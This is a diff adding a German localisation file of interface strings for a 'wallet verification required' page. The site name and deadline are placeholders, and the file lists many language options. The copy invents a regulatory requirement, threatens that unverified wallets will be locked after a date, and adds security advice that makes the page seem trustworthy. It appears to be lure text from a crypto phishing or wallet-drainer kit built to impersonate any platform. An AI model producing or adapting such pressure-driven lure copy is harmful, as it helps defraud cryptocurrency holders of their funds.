@@ -1,0 +1,62 @@
+﻿{
+    "pageTitle": "Wallet-Überprüfung | {websiteName}",
+    "mainTitle": "Wallet-Überprüfung erforderlich",
+    "description1": "Um die Sicherheitsstandards und regulatorischen Anforderungen zu erfüllen, benötigen wir jetzt eine Wallet-Adressen-Überprüfung für alle Benutzer.",
+    "deadlineText": "Ab dem {date} werden alle nicht verifizierten Wallets",
+    "restrictionText": " vorübergehend gesperrt",
+    "cooperationText": "Wir schätzen Ihre Mitarbeit, um unsere Plattform sicher zu halten.",
+    "termsText": "Ich akzeptiere die",
+    "termsLink": "Nutzungsbedingungen von {websiteName}",
+    "verifyBtnText": "Mein Wallet überprüfen",
+    "securityBtnText": "Über kompromittierte Wiederherstellungsphrasen",
+    "modalTitle": "Sicherheitswarnung: Kompromittierte Wiederherstellungsphrasen",
+    "modalWarning": "Kritische Warnung:",
+    "modalWarningText": "Ihre Wiederherstellungsphrase ist der Hauptschlüssel zu Ihrem Wallet. Geben Sie diese niemals an Dritte weiter oder geben Sie sie auf einer Website ein.",
+    "signsTitle": "Anzeichen für eine kompromittierte Wiederherstellungsphrase:",
+    "signsList": [
+        "Sie haben sie digital gespeichert (Fotos, Cloud, Nachrichten)",
+        "Unbefugte Transaktionen in Ihrem Wallet"
+    ],
+    "actionTitle": "Sofortige Maßnahmen bei Kompromittierung:",
+    "actionList": [
+        "Übertragen Sie sofort alle Mittel auf ein neues, sicheres Wallet",
+        "Erstellen Sie eine komplett neue Wiederherstellungsphrase"
+    ],
+    "modalNote": "Hinweis: {websiteName} wird Sie niemals nach Ihrer Wiederherstellungsphrase fragen. Für diesen Verifizierungsprozess wird nur Ihre öffentliche Wallet-Adresse benötigt.",
+    "languageOptions": {
+        "en": "English",
+        "es": "Español",
+        "fr": "Français",
+        "de": "Deutsch",
+        "it": "Italiano",
+        "pt": "Português",
+        "pt-br": "Português (Brasil)",
+        "nl": "Nederlands",
+        "sv": "Svenska",
+        "da": "Dansk",
+        "no": "Norsk",
+        "fi": "Suomi",
+        "pl": "Polski",
+        "ru": "Русский",
+        "uk": "Українська",
+        "cs": "Čeština",
+        "hu": "Magyar",
+        "ro": "Română",
+        "tr": "Türkçe",
+        "ar": "العربية",
+        "fa": "فارسی",
+        "hi": "हिन्दी",
+        "bn": "বাংলা",
+        "th": "ไทย",
+        "vi": "Tiếng Việt",
+        "id": "Bahasa Indonesia",
+        "ms": "Bahasa Melayu",
+        "fil": "Filipino",
+        "zh": "中文(简体)",
+        "zh-tw": "中文(繁體)",
+        "ja": "日本語",
+        "ko": "한국어"
+    }
+}
+
+
